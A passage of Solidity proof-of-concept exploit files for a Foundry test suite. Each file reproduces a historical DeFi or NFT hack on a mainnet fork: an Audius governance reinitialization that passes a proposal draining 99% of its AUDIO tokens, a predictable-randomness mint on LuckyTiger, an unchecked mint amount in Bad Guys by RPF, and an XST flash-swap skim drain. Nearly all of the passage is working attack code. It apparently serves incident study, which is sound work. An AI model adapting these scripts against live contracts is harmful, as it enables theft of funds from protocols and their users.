m Block %s ----------\", block.number);\n   112\t        emit log_named_decimal_uint(\"Attacker ETH Balance\", attacker.balance, 18);\n   113\t\n   114\t        console.log(\"-------------------- Tx1 --------------------\");\n   115\t        console.log(\"Modify configurations...\");\n   116\t        console.log(\"-> votingPeriod : 3 blocks\");\n   117\t        console.log(\"-> executionDelay : 0 block\");\n   118\t        console.log(\"-> guardianAddress : self\");\n   119\t        // function initialize(\n   120\t        // address _registryAddress,\n   121\t        // uint256 _votingPeriod,\n   122\t        // uint256 _executionDelay,\n   123\t        // uint256 _votingQuorumPercent,\n   124\t        // uint16 _maxInProgressProposals,\n   125\t        // address _guardianAddress\n   126\t        // )\n   127\t        IGovernence(governance).initialize(address(this), 3, 0, 1, 4, address(this));\n   128\t\n   129\t        console.log(\"Evaluate Proposal...\"); // this is to make sure one can submit new proposals\n   130\t        IGovernence(governance).evaluateProposalOutcome(84); // callback this.getContract()\n   131\t\n   132\t        uint256 audioBalance_gov = IERC20(AUDIO).balanceOf(governance);\n   133\t        uint256 stealAmount = audioBalance_gov * 99 / 1e2; // Steal 99% of AUDIO Token from governance address\n   134\t\n   135\t        console.log(\"Submit Proposal...\");\n   136\t        // function submitProposal(\n   137\t        //     bytes32 _targetContractRegistryKey,\n   138\t        //     uint256 _callValue,\n   139\t        //     string calldata _functionSignature,\n   140\t        //     bytes calldata _callData,\n   141\t        //     string calldata _name,\n   142\t        //     string calldata _description\n   143\t        // ) external returns (uint256)\n   144\t        IGovernence(governance).submitProposal(\n   145\t            bytes32(uint256(3078)),\n   146\t            0,\n   147\t            \"transfer(address,uint256)\",\n   148\t            abi.encode(address(this), stealAmount),\n   149\t            \"Hello\",\n   150\t            \"World\"\n   151\t        );\n   152\t\n   153\t        IStaking(staking).initialize(address(this), address(this));\n   154\t        IDelegateManagerV2(delegatemanager).initialize(address(this), address(this), 1);\n   155\t        IDelegateManagerV2(delegatemanager).setServiceProviderFactoryAddress(address(this));\n   156\t        IDelegateManagerV2(delegatemanager).delegateStake(address(this), 1e31);\n   157\t\n   158\t        console.log(\"-------------------- Tx2 --------------------\");\n   159\t        console.log(\"SubmitVote `Yes` for malicious ProposalId 85...\");\n   160\t        cheat.roll(15_201_795);\n   161\t        IGovernence(governance).submitVote(85, IGovernence.Vote(2)); // Voting Yes\n   162\t\n   163\t        console.log(\"-------------------- Tx3 --------------------\");\n   164\t        console.log(\"Execute malicious ProposalId 85...\");\n   165\t        cheat.roll(15_201_798);\n   166\t        IGovernence(governance).evaluateProposalOutcome(85); // callback this.getContract()\n   167\t        uint256 audioBalance_this = IERC20(AUDIO).balanceOf(address(this));\n   168\t        emit log_named_decimal_uint(\"AttackContract AUDIO Balance\", audioBalance_this, 18);\n   169\t\n   170\t        console.log(\"-------------------- Tx4 --------------------\");\n   171\t        console.log(\"AUDIO/ETH Swap...\");\n   172\t        address[] memory path = new address[](2);\n   173\t        path[0] = AUDIO;\n   174\t        path[1] = weth;\n   175\t        IERC20(AUDIO).approve(uniswap, 1e40);\n   176\t        IUniswapV2Router(uniswap).swapExactTokensForETH(audioBalance_this, 680 ether, path, attacker, block.timestamp);\n   177\t\n   178\t        console.log(\"-------------------- End --------------------\");\n   179\t        emit log_named_decimal_uint(\"Attacker ETH Balance\", attacker.balance, 18);\n   180\t    }\n===== LuckyTiger_exp.sol\n     1\t// SPDX-License-Identifier: GPL-3.0\n     2\t\n     3\tpragma solidity ^0.8.13;\n     4\t\n     5\timport \"forge-std/Test.sol\";\n     6\t\n     7\t/*\n     8\t    Attacker: 0x3392c91403f09ad3b7e7243dbd4441436c7f443c\n     9\t    Attack tx: https://etherscan.io/tx/0x804ff3801542bff435a5d733f4d8a93a535d73d0de0f843fd979756a7eab26af\n    10\t    poc refers to: https://github.com/0xNezha/luckyHack\n    11\t*/\n    12\t\n    13\tinterface NFT {\n    14\t    function balanceOf(\n    15\t        address _owner\n    16\t    ) external view returns (uint256 balance);\n    17\t}\n    18\t\n    19\tcontract luckyHack is Test {\n    20\t    event Log(string);\n    21\t\n    22\t    address owner = address(this);\n    23\t    address nftAddress = 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967;\n    24\t\n    25\t    function setUp() public {\n    26\t        vm.createSelectFork(\"mainnet\", 15_403_430); // fork mainnet block number 15403430\n    27\t        vm.deal(address(this), 3 ether);\n    28\t        vm.deal(address(nftAddress), 5 ether);\n    29\t    }\n    30\t\n    31\t    function getRandom() public view returns (uint256) {\n    32\t        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {\n    33\t            return 0;\n    34\t        } else {\n    35\t            return 1;\n    36\t        }\n    37\t    }\n    38\t\n    39\t    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {\n    40\t        return this.onERC721Received.selector;\n    41\t    }\n    42\t\n    43\t    function testExploit() public {\n    44\t        vm.warp(1_661_351_167);\n    45\t        console.log(\"getRandom\", getRandom());\n    46\t\n    47\t        uint256 amount = 10;\n    48\t\n    49\t        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {\n    50\t            revert(\"Not lucky\");\n    51\t        }\n    52\t        bytes memory data = abi.encodeWithSignature(\"publicMint()\");\n    53\t\n    54\t        for (uint256 i = 0; i < amount; ++i) {\n    55\t            (bool status,) = address(nftAddress).call{value: 0.01 ether}(data);\n    56\t            if (!status) {\n    57\t                revert(\"error\");\n    58\t            } else {\n    59\t                emit Log(\"success\");\n    60\t            }\n    61\t        }\n    62\t\n    63\t        console.log(\"NFT we got:\", NFT(nftAddress).balanceOf(address(this)));\n    64\t    }\n    65\t\n    66\t    function getBalance() external view returns (uint256) {\n    67\t        return address(this).balance;\n    68\t    }\n    69\t\n    70\t    receive() external payable {}\n    71\t}\n===== BadGuysbyRPF_exp.sol\n     1\t// SPDX-License-Identifier: UNLICENSED\n     2\tpragma solidity 0.8.10;\n     3\t\n     4\timport \"forge-std/Test.sol\";\n     5\timport \"./../interface.sol\";\n     6\t\n     7\t/*\n     8\tBad Guys by RPF Business Logic Flaw Exploit PoC\n     9\t\n    10\tThe exploit was due to the missing check for \"chosenAmount\" in the WhiteListMint function which allowed the attacker to pass the number of NFTs he/she wanted to mint.\n    11\t\n    12\tTo understand more about NFT Merkle Proof - https://www.youtube.com/watch?v=67vkL8XkoJ0\n    13\t\n    14\tEtherscan tx - https://etherscan.io/tx/0xb613c68b00c532fe9b28a50a91c021d61a98d907d0217ab9b44cd8d6ae441d9f\n    15\t\n    16\tforge test --contracts ./src/test/BadGuysbyRPF_exp.sol -vv*/\n    17\t\n    18\tcontract BadGuysbyRPFExploit is Test {\n    19\t    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    20\t\n    21\t    address owner = 0x09eFF2449882F9e727A8e9498787f8ff81465Ade; //owner of Bad Guys by RPF\n    22\t    address attacker = 0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e;\n    23\t\n    24\t    IBadGuysRPFERC721 RPFContract = IBadGuysRPFERC721(0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC);\n    25\t    bytes32[] merkleTree;\n    26\t\n    27\t    function setUp() public {\n    28\t        cheats.createSelectFork(\"mainnet\", 15_460_093); //fork mainnet at 15460093\n    29\t\n    30\t        // There should be an easier way to do this\n    31\t        // I tried passing it as whole array but did not work\n    32\t        merkleTree.push(0xa3299324d1c59598e0dfa68de8d8c03d7492d88f6068cdd633a74eb9212e19e5);\n    33\t        merkleTree.push(0x5dcd197f362a82daaf56545974db26aabfe335be4c7eef015d3d74ccea4bf511);\n    34\t        merkleTree.push(0x18d716ad7f5113fe53b24a30288c6989dd04e6ad881be58b482d8d58f71c42da);\n    35\t        merkleTree.push(0x97a98e092a76c15cef3709df2776cf974e2519231e79c9ad97c15a1835c5c4be);\n    36\t        merkleTree.push(0x171696d6231b4a201927b35fe2dae4b91cefb62bef849a143560ebbb49cee5df);\n    37\t        merkleTree.push(0xe89305151bbec931414ab9693bf886cf3b96dba00ca338b1c0aaae911b6dff35);\n    38\t        merkleTree.push(0x69691b91227fa34a7a9a691d355fd6c466370928ddf3d50a347e894970f10079);\n    39\t        merkleTree.push(0x78299a273b7d50bcb1d75df1694be463b9cc66c6520026b785615c4594dbb1ba);\n    40\t        merkleTree.push(0xb297db4d926f0ebc26e098afcefa63d1d86d2e047ecbc36357192ef5240ea0ea);\n    41\t        merkleTree.push(0xb875ced562ca82ce114152c899bbd085d230a17be452243fda43bf995774243e);\n    42\t        merkleTree.push(0xd284a1831379548ff6bb0b5ad75ce8d0d1fea1cdc7b40b5f8d2e2307c9eda32c);\n    43\t        merkleTree.push(0x7eff30a405cfce9989fe9d71e346d7b3616fa69b8251782898226268818f63fb);\n    44\t        merkleTree.push(0x651ec4246f6e842692770a6ebd63396b4d62b52a3406522a02f182b8a16ba48c);\n    45\t        merkleTree.push(0xee17656e8a839ac096dd5905744ada01278fc49b978260e9e3ddd92223cc18d7);\n    46\t        merkleTree.push(0xce5c61c22a5d840c02b32aaebf73c9bc3c3d71c49f22b22c4f3cae4aa1fd557b);\n    47\t    }\n    48\t\n    49\t    function testExploit() public {\n    50\t        //quick hack to enable Minting in Block#15460093\n    51\t        //In actual hack the Mint was live in Block#15460094\n    52\t        cheats.prank(owner);\n    53\t        RPFContract.flipPauseMinting();\n    54\t\n    55\t        console.log(\"[Before WhiteListMint] Attacker's Bad Guys by RPF NFT Balance: \", RPFContract.balanceOf(attacker));\n    56\t\n    57\t        cheats.prank(attacker);\n    58\t        RPFContract.WhiteListMint(merkleTree, 400); //mint 400 Bad Guys by RPF\n    59\t\n    60\t        console.log(\"[After WhiteListMint]  Attacker's Bad Guys by RPF NFT Balance: \", RPFContract.balanceOf(attacker));\n    61\t    }\n    62\t}\n===== xst_2_exp.sol\n     1\t// SPDX-License-Identifier: UNLICENSED\n     2\tpragma solidity ^0.8.13;\n     3\t\n     4\timport \"forge-std/Test.sol\";\n     5\timport \"./../interface.sol\";\n     6\t\n     7\t// Pool1: UniswapV2 WETH/USDT\n     8\t// Pool2: UniswapV2 WETH/XST\n     9\t// XST Logic Contract Address: https://etherscan.io/address/0xb276647e70cb3b81a1ca302cf8de280ff0ce5799#code\n    10\t// https://tools.blocksec.com/tx/eth/0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3\n    11\t\n    12\tcontract ContractTest is Test {\n    13\t    IERC20 XST = IERC20(0x91383A15C391c142b80045D8b4730C1c37ac0378);\n    14\t    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    15\t    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852); // WETH USDT\n    16\t    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C); // WETH XST\n    17\t    uint256 amount;\n    18\t\n    19\t    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    20\t\n    21\t    function setUp() public {\n    22\t        cheat.createSelectFork(\"mainnet\", 15_310_016);\n    23\t    }\n    24\t\n    25\t    function testExploit() public {\n    26\t        emit log_named_decimal_uint(\"Attacker WETH profit before exploit\", WETH.balanceOf(address(this)), 18);\n    27\t\n    28\t        amount = WETH.balanceOf(address(Pair2));\n    29\t        Pair1.swap(amount * 2, 0, address(this), new bytes(1));\n    30\t\n    31\t        emit log_named_decimal_uint(\"Attacker WETH profit after exploit\", WETH.balanceOf(address(this)), 18);\n    32\t    }\n    33\t\n    34\t    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n    35\t        // swap WETH to XST\n    36\t        uint256 amountSellWETH = WETH.balanceOf(address(this));\n    37\t        (uint256 reserve0, uint256 reserve1,) = Pair2.getReserves(); // r0 : XST r1 WETH\n    38\t        uint256 amountOutXST = amountSellWETH * 997 * reserve0 / (reserve1 * 1000 + amountSellWETH * 997);\n    39\t        WETH.transfer(address(Pair2), amountSellWETH);\n    40\t        Pair2.swap(amountOutXST, 0, address(this), \"\");\n    41\t\n    42\t        //XST skim\n    43\t        XST.transfer(address(Pair2), XST.balanceOf(address(this)) / 8);\n    44\t        for (int256 i = 0; i < 15; i++) {\n    45\t            Pair2.skim(address(Pair2));\n    46\t        }\n    47\t        Pair2.skim(address(this));\n    48\t\n    49\t        // sell XST to WETH\n    50\t        // XST is SupportFeeOn Token\n    51\t        XST.transfer(address(Pair2), XST.balanceOf(address(this)));\n    52\t        uint256 balanceOfXST = XST.balanceOf(address(Pair2));\n    53\t        (uint256 reserve3, uint256 reserve4,) = Pair2.getReserves(); // r3 : XST r4 WETH\n    54\t        uint256 amountSellXST = balanceOfXST - reserve3;\n    55\t        uint256 amountOutWETH = amountSellXST * 997 * reserve4 / (reserve3 * 1000 + amountSellXST * 997);\n    56\t        Pair2.swap(0, amountOutWETH, address(this), \"\");\n    57\t\n    58\t        // repay falshswap\n    59\t        WETH.balanceOf(address(this));\n    60\t        WETH.transfer(address(Pair1), (amount * 2) * 1000 / 997 + 1000);\n    61\t    }\n    62\t}\n"}}
